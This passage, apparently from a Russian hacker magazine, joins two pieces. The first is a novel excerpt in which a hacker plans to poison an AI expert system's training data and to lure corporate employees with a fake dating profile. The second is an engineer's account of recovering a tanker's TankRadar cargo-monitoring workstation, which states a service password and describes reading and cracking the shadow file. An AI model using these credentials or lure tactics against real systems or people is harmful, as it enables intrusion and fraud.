любил подобные пьянки: потом полдня ходишь с ощущением, словно под‐
цепил какой‑то особо прилипчивый грипп, борешься с приступами тошноты
и соображаешь с трудом. Он зашел в ванную, сунул башку под струю холод‐
ной воды — горячую как раз в очередной раз по непонятным причинам отклю‐
чили, — но просветления так и не достиг. Мысли путались, то появляясь, то
исчезая, то перескакивая с одного на другое, лениво плавали в голове
отдельными обрывками, не желая складываться в цепочки.
  На столе стоял открытый ноутбук, который он зачем‑то включил среди ночи
и сейчас уже совершенно не помнил зачем. На экране светились какие‑то
графики, в открытом окне терминала лениво ползли строчки логов. Кирилл
вглядывался в изображение воспаленными слезящимися глазами, и ему
вдруг начало казаться, что картинка будто подстраивается под его взгляд
и исчезает, стоит отвести глаза. Он отправился на кухню, поставил на плиту
чайник и, не дойдя до комнаты, замер в дверях: отсюда, издалека, возникала
странная иллюзия, будто один и тот же фрагмент логов в терминале выглядит
по‑разному в зависимости от того, под каким углом он на него смотрит.
Где‑то на границе подсознания, между мороком и явью, возникло тревожное
ощущение, будто не он анализирует данные, а данные анализируют его.
   «Вот так, наверное, и сходят с ума», — отрешенно подумал Кирилл. Он
моргнул, потом еще раз, словно надеясь, что изображение на экране оду‐
мается и вернется к чему‑нибудь привычному и однозначному. Но графики
продолжали жить своей жизнью — стоило ему сфокусироваться на одном
участке, как остальное расплывалось, утрачивая смысл. Он прекрасно осоз‐
навал, что это всего лишь иллюзия, игра усталого мозга, отравленного пох‐
мельем. Хорошо бы поспать еще пару часов, чтобы окончательно прийти
в себя, но одна назойливая мысль, крутившаяся вокруг ботнета, Лиама,
TerraCore и «Перцептрона», все‑таки не давала ему покоя.
   Если  он,  живой  человек,  не  способен  сейчас  отличить  реальное
от кажущегося, то почему он уверен, что машина умеет это лучше? Ведь
«Перцептрон» — всего лишь неразумная экспертная система, она тоже
не видит мир — она видит только отражение, набор признаков, которые
кто‑то когда‑то назвал важными. Кирилл все это время пытался спорить
с системой на ее языке: атаковать, обходить, переигрывать. Но система
не умеет думать, она использует имеющиеся алгоритмы и обучается. А зна‐
чит, самый уязвимый момент — не принятие решения, а процесс формирова‐
ния привычек. Не логика, а память.
   «Перцептрон», если он все еще жив и инженеры восстановили программы
из резервных копий, не в состоянии отличить правду от хорошо оформленной
лжи, если та повторяется достаточно долго и выглядит статистически убе‐
дительно.
   Стоило подумать об этом, похмелье, кажется, стало понемногу отступать.
На кухне засвистел чайник, и Кирилл вздрогнул от неожиданности. Он вык‐
лючил газ, налил воды в кружку и поймал себя на том, что руки больше
не дрожат. Мысли, еще минуту назад липкие и тяжелые, начали обретать
ясность. Кирилл вдруг вспомнил, как в детстве родители учили его ездить
на велосипеде: отец бежал рядом,  придерживая его за  седло, потом
отпускал — и он ехал, не понимая, почему еще не падает. Потом, конечно же,
падал, но не потому, что что‑то случилось с ним или с транспортным средс‐
твом, а потому, что исчезла поддержка. Основанные на сложной логике
экспертные системы учатся и работают так же.
 — Значит, тебя тоже можно научить падать, — зачем‑то сказал он экрану.
  Идея была простой до неприличия. Не ломать защиту, не искать уязвимос‐
ти, не подменять команды. Всего лишь стать для «Перцептрона» источником
опыта. Аккуратно, без резких движений, день за днем показывать ему мир,
в котором угроза выглядит совершенно иначе, чем привыкла считать система.
В котором настоящей угрозой является она сама.
   Кирилл сделал глоток чая и обжегся, но даже это ощущение показалось
ему сейчас приятным: значит, он еще жив. Проверив на всякий случай почту,
он открыл новый текстовый файл и принялся записывать туда свои идеи, пока
они не остыли.





Стрелки часов уже перевалили за полдень, когда Кирилл толкнул дверь
«Синего экрана». В игровой зоне шумно резались в «Денди» двое мужиков
лет тридцати, а в «офисной» части полуподвала царила деловая атмосфера:
Маша что‑то рисовала на собранном Кириллом специально для нее компе,
а Сергей ковырялся в лежащем на столе системнике, время от времени бро‐
сая в ее сторону странные взгляды.
 — Кикс, смотри, что мне на остановке сунули, — Иван протянул Кириллу
цветной обрывок рекламной листовки, — у нас тут на районе настоящую пиц‐
церию открыли, прикинь? Может, это, пиццу закажем?
 — Нам сегодня не до жира, есть работа из Алжира, — продекламировал
родившийся экспромтом стишок Кирилл. — Вернее, из самых что ни на есть
соединенных промеж собой штатов Америки.
   Адиль прямо с утра прислал целых два простых заказа: на сайт‑визитку
крошечного семейного бизнеса по развозке пассажиров частным минивэном
из аэропорта Лос‑Анжелеса по близлежащим окрестностям и на страничку
какой‑то религиозной общины из пенсильванского городка, который он даже
не смог отыскать на карте. О цене договорились быстро. Выполнить этот
пробный заказ Кирилл планировал за пару ближайших дней. Выудив из кар‐
мана пачку долларов, Киря раздал причитающуюся каждому долю получен‐
ного вчера от Стаса гонорара.
 — Спасибо, — буркнул Сергей, даже не посмотрев в его сторону, и оста‐
вил деньги на столе, рядом с раскиданными в беспорядке отвертками.
 — Серёг, может, отвлечешься ненадолго, послушаешь последние новос‐
ти?
 — Потом, — с безразличным видом ответил тот, продолжая копошиться
в недрах системного блока, — я сейчас занят немного. И вообще не уверен,
что хочу дальше сайтами заниматься… Вот, может, еще варианты поищу.
Мама говорила, им на работе админ нужен…
 — Погоди, — тронул его за плечо Кирилл, — ты что, хочешь клуб бросить
и уйти?
 — Да не знаю пока, говорю же, — отмахнулся тот. — Не решил еще.
   Кирилл огляделся, ничего не понимая. Сделал глазами знак Ивану, кивнул
в сторону выхода. Тот понял без слов и молча потопал на улицу, а Киря устре‐
мился вслед за ним.
 — Вань, чего вообще происходит‑то? — обратился к нему Кирилл, когда
они очутились во дворе и отошли от крыльца на пару шагов.
 — Блин, да Серый, по  ходу, в Машку  втрескался, —  ухмыльнулся
Зарубин, — он типа позвал ее в кино, а сеструха его на фиг отшила. Говорит,
у нее парень есть.
   «Час от часу не легче», — подумал Киря. Мало ему других забот, теперь
вот еще и это… © X
GEEK





Вечер прошел странно. Серёга молча ковырял свой комп,
стараясь не пересекаться ни с кем взглядом, Иван, пок‐
рутившись  немного  среди  игровых  приставок,  сбежал
куда‑то по своим делам, а Маша усердно рисовала новую
«шапку» для сайта «Синего экрана», периодически показы‐
вая Кириллу промежуточный результат. Ей явно хотелось
перемолвиться с ним парой слов с глазу на глаз, но в при‐
сутствии Сергея сказать об этом она, очевидно, стеснялась.
Кирилл всё понимал и делал вид, что не замечает. Он вооб‐
ще в этот вечер слишком много делал вид. Что всё в поряд‐
ке, что тишина в помещении — рабочая, а не натянутая,
как  провод  под  напряжением.  Внешне  всё  выглядело
как обычно — и от этого становилось еще неуютнее. Кириллу
казалось, что, если бы сейчас вдруг что‑нибудь сломалось,
вырубилось электричество или в клуб ввалились пьяные гоп‐
ники, он почувствовал бы облегчение. Любое неожиданное
событие стало бы счастливым избавлением от этой гне‐
тущей атмосферы.


   Минут через сорок Кирилл понял, что дальше так сидеть бессмысленно.
Ничего полезного он явно сегодня уже не сделает, а его присутствие, похоже,
лишь усиливает общее напряжение.
 — Ладно, пойду я, пожалуй, — сообщил он в пустоту, натягивая куртку, —
завтра моя очередь дежурить, так что самое время немного подготовиться
к грядущим трудовым подвигам…
   Маша сделала вид, что что‑то ищет в сумке. Сергей ответил не сразу: он
аккуратно закрыл крышку системника, закрутил два болта и только потом под‐
нял глаза.
 — Счастливо, — кивнул он. — Завтра поговорим.
 — Ну завтра так завтра, — вздохнул Кирилл, не ожидая от этой беседы
ничего хорошего.





Маша догнала его, когда он покинул двор и свернул в переулок, чмокнула
в щеку и сразу же стерла ладошкой оставшуюся на коже помаду. Они прошли
немного молча. Фонари в переулке отбрасывали густые черные тени, асфальт
был неровный, с лужами, в которых отражались желтые квадраты окон. Маше
явно хотелось заговорить, но она тянула, словно подбирала подходящие сло‐
ва.





— Я с Серёжей сегодня разговаривала, — сказала она наконец, глядя не на
Кирилла, а куда‑то в сторону многоэтажек, похожих на замершие у пристани
корабли. — Днем, пока тебя не было.
 — Угу, мне Иван даже в общих чертах рассказал, о чем, — кивнул Кирилл.
 — Он какой‑то странный сейчас, — продолжила Маша. — Не в плохом
смысле. Сначала мялся, смотрел исподлобья, потом собрался с духом,
подошел и заявил, что я ему нравлюсь. Забавно так получилось. В кино вот
пригласил, прикинь? Я, честно говоря, растерялась немного, даже не сооб‐
разила сразу, что ему ответить.
   Кирилл молчал, ожидая продолжения.
 — В общем, я сказала ему правду. Что у меня есть парень. И что я не хочу
никого обманывать.
   Девушка подняла глаза и заглянула своему спутнику в лицо, словно пыта‐
ясь определить, о чем он сейчас думает.
 — И что?
 — И всё, — она пожала плечами. — Он ничего не ответил, просто пос‐
мотрел на меня как‑то странно… Знаешь, как будто я случайно сломала ему
что‑то внутри.
  Они снова замолчали. Где‑то неподалеку хлопнула дверь подъезда, про‐
ехала машина, нарушив тишину шорохом шин. Кирилл вдруг остро почувство‐
вал, насколько хрупким оказалось все то, что он с недавних пор считал
более‑менее устойчивым. Они остановились у перекрестка: Маша жила
по правую руку, дом Кирилла располагался в другой стороне.
 — Ты к себе сейчас? — спросил он.
 — Есть другие предложения? — игриво сверкнула глазами девушка. —
Хочешь позвать в гости?
 — Так я не против, — улыбнулся Кирилл, — тем более ремонт сам себя
не доделает.
 — Нет, пойду все‑таки, — вздохнула она, — я дяде обещала после десяти
не возвращаться. Ну и за Иваном надо присматривать, у него самый трудный
возраст сейчас.
 — Слушай, а ты ведь мне раньше не рассказывала, — сменил тему Кирилл
и как‑то незаметно повернул в сторону ее дома, — как так получилось, что он
один с отцом остался? У него мать жива вообще?
 — Жива, — поморщилась Маша, словно отхлебнула из кружки прокисшего
молока, — там долгая история. Вообще, дядя Володя, ну, Ванин отец, он род‐
ной брат моей матери. Мама с папой в Краснодаре живут, дядя Володя тоже
оттуда. Где‑то на курорте лет восемнадцать назад он познакомился с тетей
Зоей, потом переехал к ней в Питер. На работу устроился, Ванька родился…
Она на тот момент в разводе, кстати, была, у нее еще один сын от первого
брака есть, но он армейский контракт подписал, где‑то на Камчатке служит…
Короче, тетка Зоя и раньше заложить за воротник любила, а как они пожени‐
лись, стала еще чаще выпивать. Сначала по выходным, а последние лет пять
так вообще чуть ли не каждый день. Дядя ее лечить пытался, в клиники разные
укладывал, но ничем это не заканчивалось, кроме скандалов. Пару раз у нее
даже глюки начинались натуральные, представляешь? С ножом за ним бегала
по квартире… В общем, в какой‑то момент ее  окончательно выперли
с работы, и тогда она спуталась с такими же алкашами, стала из дома ухо‐
дить, то на день, то на неделю. Дядька Володя ее искал поначалу, находил
в каких‑то заблеванных квартирах в компании таких же синяков, возвращал
домой. Потом плюнул. Не до того ему, он работает, Ваньку поднять пытается,
чтобы и на еду, и на одежду хватало… Ваня ведь растет, да еще и кобянится:
то не буду носить, это не буду. Потому и стал таким оболтусом, воспитывать
его было некому.
 — Да нормальный он парень, несдержанный просто, — высказал свое
мнение Кирилл. — А тебя, значит, к нему нянькой приставили?
 — Ну, можно и так сказать, — хохотнула Маша, — на самом деле не к нему,
конечно. Мама хотела, чтобы я дяде немного помогала, и по хозяйству,
и вообще. Ему одному трудно очень. Поэтому она обрадовалась, когда узна‐
ла, что я хочу в Питере учиться, договорилась, что я у дяди жить буду. В инсти‐
тут я, правда, не поступила, ну, в шараге тоже какой‑то диплом дадут…
 — Если захочешь, потом поступишь, — обнадежил ее Кирилл. — Глав‐
ное — решить, надо оно тебе или нет.
 — Ладно, я побежала, — девушка снова чмокнула его в щеку, — у меня
еще дел полно дома. А с Серёгой‑то что дальше делать?
 — Не знаю пока, — растерянно пожал плечами Киря. — Это обмозговать
надо.
 — Мне кажется, — Маша на мгновение остановилась, словно передумала
спешить домой, — что для Серого этот клуб — как любимая игрушка, он бук‐
вально живет им. Если он уйдет, все рассыплется. У тебя, конечно, есть энер‐
гия и голова на плечах, такие люди и создают крутые вещи, диванных меч‐
тателей намного больше. Только без команды не получится все вытянуть
в одиночку. Просто подумай об этом. Ну все, мне пора.
   Проводив взглядом ее удаляющуюся фигуру, он повернул к себе, прошел
несколько шагов и только потом понял, что идет слишком быстро, словно
пытается убежать от самого себя. Пришлось немного сбавить темп.
  А ведь Маша полностью права. Кирилл поймал себя на неприятной мысли,
что ни разу всерьез не спрашивал Сергея, чего тот вообще хочет. Не в
бытовом смысле — «пиццу купим или шаверму», — а по‑настоящему. Все
решалось как‑то само собой: Кирилл предлагал, Серёга безропотно сог‐
лашался. Удобная, почти идеальная конфигурация. Для одного человека.
  Он шел и прокручивал в голове недавние разговоры, мелкие эпизоды,
на которые раньше не обращал внимания. Как Серёга задерживался после
закрытия клуба, возился с проводкой, чинил раздолбанные посетителями
стулья, таскал в какую‑то мастерскую мониторы, которые не мог отремон‐
тировать сам. Как переживал из‑за каждой копейки аренды, потому что клуб
с самого начала едва сводил концы с концами, а в некоторые месяцы и вовсе
приносил убыток. Пару раз Сергей даже доплачивал недостающее из своего
кармана, наверное попросив денег в долг у мамы, и говорил, что потом
заберет вложенную сумму из кассы. А вот забрал ли? Кирилл как‑то не удо‐
сужился это проверить. В конце концов, именно Серёга взял его в клуб, когда
сам он пребывал в полнейшем смятении и совершенно не представлял,
как жить и чем заниматься дальше. «Синий экран» придал его существованию
хоть какое‑то направление и смысл.
  Чем дольше Кирилл об этом думал, тем отчетливее вырисовывалась кар‐
тина, от которой хотелось поморщиться. Серёга ведь с самого начала не был
авантюристом или прирожденным коммерсантом. Типичный домашний маль‐
чик, привыкший слушаться маму, жить по правилам, по выходным пылесосить
комнату, а на завтрак кушать овсяную кашу, потому что так положено и так
сказали взрослые. Таких не бьют в школе, но и всерьез никогда не воспри‐
нимают, потому что они слишком правильные и чересчур тихие. Влад быстро
смекнул, с кем имеет дело. Улыбался, хлопал Серёгу по плечу, говорил пра‐
вильные слова про «общее дело», а сам спокойно скидывал на него всю
рутину и все риски. А теперь выходило, что Кирилл сам занял место Влада.
Не из злого умысла, конечно, просто так получилось. Серёга соглашался —
значит, все в порядке. Не спорит — следовательно, его все устраивает.
Кирилл что‑то предлагал, организовывал, договаривался, а Сергей привычно
подставлял плечо, не задавая лишних вопросов.
  Ему вдруг стало не по себе от мысли, что Серёга, возможно, и влюбил‐
ся‑то в Машу не потому, что она какая‑то особенная — хотя она, конечно,
особенная, — а потому, что рядом с ней он впервые почувствовал себя
человеком, который что‑то делает сам и от которого хоть что‑то зависит. И тут
его снова отодвинули в сторону. Картина складывалась неприятная, но логич‐
ная. Если Сергей сейчас уйдет, это будет не каприз и не обида отвергнутого.
Это станет единственным доступным ему способом проявить наконец харак‐
тер. И он будет в чем‑то прав, потому что Кирилл на самом деле никогда
не считал его равным. Вот только совершенно неясно, что теперь с этим
делать… Если все оставить как есть, Кирилл рискует потерять и клуб, и только
что наметившийся источник постоянного дохода. И,  главное, товарища,
которого он так и не научился пока называть своим другом.





Дома он привычно поставил на плиту чайник и включил ноутбук. В почтовом
ящике ждало письмо от Габриеля: бразилец интересовался, доволен ли
Кирилл его работой и не нужна ли еще какая‑нибудь помощь. Он уже
собирался ответить дежурной благодарностью, но замер в задумчивости.
   Помощь, конечно, понадобится. Если Кирилл прав в своих предположе‐
ниях и Лиам все еще связан с TerraCore, противостояние с ним автоматичес‐
ки означает войну с этой огромной корпорацией. То, что он однажды уже одо‐
лел ее, сейчас ничего не значит: тогда за его спиной стояла опытная команда,
имелся мощный ресурс, в конце концов, был Санчо. Сейчас он один. И,
как правильно сказала Маша, вытянуть такое в одиночку — почти нереально.
Кроме того, зализав раны после прошлого провала, «Терра» наверняка сде‐
лала правильные выводы из собственных ошибок. Теперь «Перцептрон»
или то, что от него осталось, будет гораздо тщательнее мониторить сетевой
периметр и жестче реагировать на любые попытки просканировать порты
или исследовать работающие там сервисы. А значит, нужно действовать ина‐
че. Осмотрительнее, осторожнее и желательно совсем с другой стороны,
откуда опасности никак не ждут…
   Вся эта любовная история совершенно выбила Кирилла из колеи: вместо
мыслей о том, что делать с захваченным ботнетом и «Террой», в голове кру‐
тились обрывки недавних разговоров с Серёгой и Машей… Хотя стоп! Отно‐
шения ведь и вправду важнейший драйвер всех без исключения человеческих
поступков, а значит…
   Кирилл открыл в браузере поисковик и набрал несколько строк: кажется,
у него родилась интересная идея о том, как решить возникшую задачку.
   Интернет не забывает ничего и никогда. Он, как старый дворник, может
притворяться равнодушным, но все равно прекрасно помнит, кто и куда выб‐
росил пакет с мусором. В сети есть люди, воспитавшие в себе очень нужный
и полезный навык: они умеют находить и поднимать этот мусор, вдумчиво изу‐
чать его и делать правильные выводы.
   Кирилл не искал что‑то конкретное, он ворошил груды информации, наде‐
ясь наткнуться на то, что может оказаться полезным. Старые резюме, объ‐
явления о поиске работы, забытые сообщения на форумах, личные странички
в набравшем недавно популярность «Живом журнале». Смотрел туда, куда
интересующие его люди заглядывали несколько лет назад, что‑то проком‐
ментировали, разместили фотографии, что‑то пообещали, а потом забыли
стереть. Чтобы облегчить себе задачу, он набросал несколько простеньких
скриптов: один шерстил блоги и списки рассылок, выискивая сообщения
по заданным никам, именам, фамилиям и ключевым словам, другой вытас‐
кивал адреса веб‑страниц из интернета и кеша поисковиков, складывая
добычу в аккуратную табличку. Третья программа сопоставляла почтовые
адреса с именами и никами на форумах: машина делала то, что ее хозяину
было бы лень, — перебирала, сравнивала, сортировала результаты.
   Вот человек пишет о «безумных дедлайнах» — значит, перерабатывает.
Вот жалуется на руководство — следовательно, не слишком лоялен к своему
работодателю. Вот внезапно исчезает с форумов на пару недель — воз‐
можно, получил новую должность или укатил в отпуск; а вот появляется снова,
хвастаясь фотографиями с гавайского пляжа и бронзовым загаром, — ну точ‐
но, отдыхал на море. Кирилл поймал себя на странном ощущении: он как буд‐
то читал чужие дневники, разбросанные по всему интернету, и по крупицам
собирал из них портреты людей, которых никогда раньше не видел. Один
привык быть незаметным, другой любит, чтобы его хвалили, и болезненно
реагирует на критику. Против этого бессильна любая интеллектуальная ана‐
литическая система: тот же «Перцептрон» прекрасно умеет защищаться
от атак, но не от простого человеческого любопытства.
  В конце концов проделанная работа принесла даже не первые результаты,
а, скорее, смутный намек на них. Кирилл наметил для себя двух интересных
кандидатов: оба трудились в TerraCore, один — инженером по релизам, вто‐
рой — программистом‑разработчиком, но в разных офисах. Оба — мужчины
средних лет европейской внешности, оба имеют доступ к обучающим данным
экспертной системы «Терры», оба, судя по их постам в сети, перегружены
работой и совсем не ощущают себя «солдатами корпорации». Один из них
явно  чувствует себя  недооцененным,  второй,  учитывая  его  активность
на форумах, склонен к общению и при этом страдает от одиночества.
Но главное — у обоих имеются анкеты на одном из самых популярных в Аме‐
рике сайтов знакомств.
   Кирилл посмотрел на часы: они показывали без десяти девять утра,
позади осталась еще одна бессонная ночь. Отключив мобильник от зарядки,
он открыл телефонную книгу и набрал знакомый номер. Маша ответила прак‐
тически сразу.
 — Привет. Не спишь?
 — Привет, нет, в шарагу собираюсь. А ты чего звонишь в такую рань?
 — Дело к тебе есть. Маш, сможешь изготовить десяток фото сексуальной
девушки, приятной, но не слишком броской и примелькавшейся внешности?
Так, чтобы фотки выглядели не вызывающими, а такими… Ну, бытовыми, что
ли. Но при этом главное, чтобы у мужика при одном взгляде на них сразу
зашевелилось в известном месте.
 — Ну, смогу, в принципе…
 — Класс. Давай тогда сделаем так, чтобы девушка была откуда‑нибудь
из Южной Америки. Скажем, из Бразилии, там много красивых ярких брю‐
неток, прям таких, как ты. Сделаешь?
 — Ну можно… — задумчиво протянула художница. — А чего ты там затеял?
 — Потом расскажу, — пообещал Кирилл и добавил с иронией: — Ты
про дейтинг‑скам слышала что‑нибудь? Ну вот заодно и узнаешь много
нового. Тебя я уже покорил, теперь буду мужиков соблазнять, нужно ведь
как‑то разнообразить личную жизнь… © X
GEEK





Что  первым  приходит  на  ум  человеку,
далекому от моря, когда он слышит «моряк
дальнего плавания»? Конечно, романтика,
свобода и дух приключений, закаты и рас‐                                                                              Marine Electro-Technical
светы над  водной гладью,  экзотические                 Officer
страны  и... Джек Воробей! Капитан Джек
Воробей!


К сожалению, вся эта романтика заканчивается на первой же практике.
А дальше начинаются суровые трудовые будни, бессонные ночи во время
шторма, ночные авралы и тоска по родным берегам. Но, несмотря на это,
всегда остается место для маленького приключения. В одно из таких мы
с тобой и отправимся в этой статье.
   Современные танкеры, перевозящие нефть, — технические монстры,
от одного вида которых внутри поднимается буря эмоций. Степень их авто‐
матизации запредельна: множество автоматизированных систем, невообра‐
зимое число датчиков, исполнительных механизмов и километры проводов,
связывающих все воедино.
   Судовая система мониторинга груза (Cargo Monitoring System, CMS) нужна
для мониторинга танков, сигнализации и работы с жидкими грузами на борту
судна.





«Мозговой» центр системы — две рабочие станции: Active Master Workstation
и Redundant Master Workstation.





Система устроена так, что в каждый момент времени может быть только одна
активная рабочая станция (Active Master Workstation), а вторая используется
как резервная (Redundant Master Workstation) на случай выхода из строя пер‐
вой. Переключение  между  станциями  происходит  автоматически через
Redundancy Box. Восстановление Redundant Master Workstation я и покажу
в этой статье.
   Вообще говоря, поиск и скачивание программ, файлов, образов ОС, да и
вообще доступ к интернету на судне — тот еще квест! О доступе к тор‐
рент‑трекерам и видеохостингам можно просто забыть. Я застал еще те вре‐
мена, когда интернет на судне был по карточкам на 100 Мбайт, по пять штук
на члена экипажа, со скоростью около 30 Кбит/с. Этого хватало только
на общение в мессенджерах. Сейчас, конечно, ситуация лучше: ограничений
по трафику уже нет, но проблемы со скоростью остались.


ПЕРВЫЙ РЕЙС НА НОВОМ ДЛЯ СЕБЯ ТАНКЕРЕ

CMS Rosemount TankRadar STaR от Emerson. С такой системой я раньше
не работал, поэтому, вооружившись мануалами, погрузился в детальное изу‐
чение. Redundant Master Workstation радостно встретила меня пустой заг‐
лушкой. Не отображалась информация по грузовым и балластным танкам,
осадкам судна, а вместо этого — куча ошибок: communication fail, system fail,
system error и так далее.





Во время запуска и инициализации рабочей станции я заметил, что она
работает под управлением ОСРВ QNX 4.25G. Опыт работы с ней у меня
отсутствовал, а знания ограничивались лишь тем, что ОС QNX лежала в осно‐
ве операционной системы BlackBerry. Но тем интереснее будет восстановить
рабочую станцию и разобраться с новой для себя ОС.
   Сервисные отчеты, которые удалось найти на судне, показывали: несколь‐
ко сервисных инженеров пытались восстановить рабочую станцию, но безус‐
пешно. В этих записях, к сожалению, не было ничего, что могло бы пригодить‐
ся для изучения неисправности. Все сводилось к банальному «система очень
старая, ее нужно заменить более современной».
  В судовой документации по системе нашел любопытную подробность:
при поставке оборудования на судно и первичной настройке используется
установочная дискета (теперь ты можешь судить о возрасте системы и о том,
почему сервисные компании так настаивали на ее замене!), которая должна
оставаться на борту.
  На своем судне я дискеты не нашел, связался с коллегами с систершипа
(идентичное судно с такими же характеристиками, построенное на той же
верфи) с просьбой помочь и посмотреть, не завалялась ли дискета, — ответа
так и не дождался...
   Раз поиски дискеты оказались тупиковым вектором, я решил сосредото‐
читься на изучении структуры и содержимого программы TankRadar STaR
на работающей Active Master Workstation. Как типичная судовая автомати‐
зированная система, CMS имеет уровни доступа: operator или daily user
(обычно без прав на изменение настроек), master (доступ к минимальным
настройкам) и «режим бога» — service. Уровень service открывает безгранич‐
ные возможности для обслуживания системы — от создания резервной копии
и копирования базы данных до всяких настроек.
   Зачастую сервисные пароли от старых систем давно известны, поэтому я
был уверен, что найду их в интернете. Как же сильно я ошибался! Остаток
рейса я провел в безрезультатных попытках найти этот пароль, перелопатил
кучу профильных морских форумов и Telegram-каналов. За весь рейс (четыре
с половиной месяца) я так и не смог приблизиться к цели ни на шаг. Но не
спеши покидать нас, дорогой читатель, ведь самое интересное будет ждать
нас в следующем рейсе. Stay tuned, как говорится!


ВТОРОЙ РЕЙС НА ТАНКЕРЕ

Сменить судно — нормальная практика для моряка. Обстоятельства могут
быть разными, например банально «не сработался с экипажем». Зачем нап‐
рягаться, восстанавливая какой‑то механизм или систему, если в следующий
рейс идешь работать на другое судно? Вернуться на судно меня заставило
непреодолимое желание найти решение и восстановить рабочую станцию, я
был уверен, что все получится.
  В одном Telegram-канале нашел пост, опубликованный всего за полтора
месяца до моей второй посадки на судно. В нем автор делится списком сер‐
висных паролей для CMS TankRadar, но для предыдущего поколения — Gen 3.
Наша уже Gen 5.
   Сервисный пароль назначают системе по ее серийному номеру. У нашей
системы номер R1505, но в списке указаны пароли только для систем
с номерами от R100 до R1300 — наша туда не попадает. При более вни‐
мательном изучении списка паролей обнаружилась любопытная закономер‐
ность: пароли состоят всего из 20 имен и цифр, имена идут по кругу и сов‐
падают у систем с одинаковыми последними цифрами серийного номера.
У нашей системы номер заканчивается на 5, и у всех систем с номерами,
заканчивающимися на 5, в пароле есть имя kevin. Перебором подобрал под‐
ходящий сервисный пароль — 223kevin. Теперь можно с пристрастием изу‐
чить возможности сервисного меню.





Наиболее интересными оказались утилиты Install/Backup, Process Debugger,
Zedit и Shell.
   Zedit оказался графическим редактором. Тут возник вопрос: зачем на сис‐
теме мониторинга грузовых операций на танкере графический редактор?
Чтобы старший помощник капитана не скучал во время грузовых операций
и рисовал? Безусловно, моряки еще те творческие люди... В общем, вопрос
оставался открытым.
  С помощью встроенного в Process Debugger примитивного файлового
менеджера Show File я смог изучить содержимое жесткого диска. Взгляд сра‐
зу зацепился за файлы, в названии которых было .pict, — возможно, их можно
открыть тем самым графическим редактором Zedit. Так и оказалось.





Программу добавили в систему для работы с графическими файлами,
с помощью которых отображался внешний вид судна, схема грузовых и бал‐
ластных танков и расположение на них данных. Как раз в этот момент судну
сменили название, и его надо было отобразить на рабочей станции. Найдя
нужный файл .pict, который отвечал за отображение имени, я успешно отре‐
дактировал его, указав новое название. Старший помощник капитана опре‐
деленно будет доволен!
   Утилита Install/Backup позволяла сделать копию базы рисунков, данных
по грузовым и балластным танкам, а также настроек грузовой программы.
Вспоминая пустой экран на Redundant Master Workstation, я подумал, что
наверняка можно перенести существующую базу данных с работающей Active
Master Workstation.
   Программа позволяла сделать бэкап на два типа носителей: дискету
и флешку. Но по какой‑то причине пункт USB Memory на Active Master
Workstation был неактивен, а дискета… Где посреди Индийского океана раз‐
добыть такой антиквариат? ПВЗ маркетплейсов туда еще не завезли, чтобы
оперативно заказать.
  На Redundant Master Workstation оба пункта были активны.





Первая мысль — проверить настройки BIOS: возможно, там отключены USB-
порты. Так и оказалось. После их включения мне удалось успешно сделать
бэкапы и развернуть их на Redundant Master Workstation.





Бам! Рабочая станция запущена, Посейдон определенно благоволит нам
в этот раз.





Казалось бы, система работает, обе рабочие станции активны, можно завер‐
шать наше приключение. Но из‑за того, что станции теперь стали точными
копиями друг друга, они функционируют не так, как задумывал произво‐
дитель. Теперь система видит их как две Active Master Workstation и уходит
в циклическую перезагрузку, вызывая общий сбой.
   Очевидно, должен быть параметр, по которому система отслеживает, кто
будет Active, а кто — Redundant. Две рабочие станции объединены в локаль‐
ную сеть, и первая мысль, приходящая в голову, — проверить сетевые адре‐
са. Адреса прописаны, различаются — здесь все ок. Дальнейшие блуждания
по настройкам, к сожалению, ни к чему не привели.
   Видимо, пора вспомнить, что наша система работает на QNX 4.25,
и разобраться, как в ОС происходит идентификация компьютеров в сети.
Для этого используется так называемый Node ID — логический идентифика‐
тор узла, который обычно присваивается по порядку, начиная с 1. Все про‐
цессы QNX оперируют логическими ID узлов. Логические ID должны быть уни‐
кальными для всех узлов во всех соединенных QNX-сетях, иначе сеть просто
не сможет работать. В тот момент обе станции имели Node ID = 1 , поэтому
и не могли работать одновременно.





И как изменить ID узла?
   Легкий морской бриз подсказывал: раз это Unix-подобная система, зна‐
чит, решить задачу можно через shell, который как раз прячется в Service-
меню.





                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИGEEK

   ИДЕМ ПО ЗВЕЗДАМ
             КАК Я В СУДОВЫХ УСЛОВИЯХ
            ЧИНИЛ РАБОЧУЮ СТАНЦИЮ
        СИСТЕМЫ МОНИТОРИНГА ГРУЗА
                      TANKRADAR STAR




Сочетания root/root, admin/admin и все знакомые мне пары логин/пароль
не подошли. Попробовал сервисный пароль от системы — тоже мимо.
   Unix-подобные системы хранят данные о пользователях вместе с паролем
в текстовом файле /etc/passwd. Однако вместо паролей там стоит символ x ,
а сами пароли хранятся в отдельном файле /etc/shadow.
   Через файловый менеджер Show  File в программе Process Debugger
нахожу эти файлы.





Радостно ввожу добытый пароль — не подходит. А с чего бы ему подходить?
Пароль же хранится в зашифрованном виде! Будем пытаться брутфорсить
с помощью John the Ripper. На судах чаще всего стоят офисные компьютеры
со встроенной графикой — по оценке программы, пароль взломался бы при‐
мерно через десять лет, и то не факт, что получилось бы. Столько ждать я
не стал.
   Перелопатив кучу информации в интернете, я нашел, как мне показалось,
самое  доступное в судовых  условиях решение — снять  жесткий диск
с рабочей станции, подключить его к другому ПК как внешний и отредак‐
тировать файлы passwd и shadow.
   Проблема, с которой я столкнулся, — Windows не видит файловую систему
QNX и, естественно, не может работать с файлами на жестком диске с этой
ОС. Раскопал динозавра среди программ — WinQFile, которая читает фай‐
ловую систему QNX, но, как выяснилось, редактировать файлы и копировать
их обратно на диск она не умеет.
  Не найдя решения со снятым жестким диском, решил установить чистую
QNX 4.25, чтобы подключить диск и отредактировать файлы passwd и shadow.
Надо уточнить, что система раритетная: ее ставили с дискет (в комплекте
было шесть штук) и применяли в основном в промышленности. Найти уста‐
новочные файлы было непросто, но в итоге я откопал их на сайте retrolib.info ,
где кто‑то коллекционирует раритетные ОС, в том числе есть образ QNX 4.25.
   Создать установочную флешку или CD у меня не получилось, а дискет,
как уже говорил, не было — да и толку от них было бы немного: позже выяс‐
нилось, что флоппи‑дисководы на рабочих станциях не работали. Я поп‐
робовал  развернуть готовый образ QNX  4.25 на  виртуальную машину
(VirtualBox) в Windows 11 — система установилась, но внешний жесткий диск
так и не увидела. Печалька!
   Следующим вариантом решил попробовать установку QNX 6.2.0 NC. Эта
система новее, распространялась бесплатно по некоммерческой лицензии,
ее можно поставить из Windows как вторую систему, и она поддерживает ОС
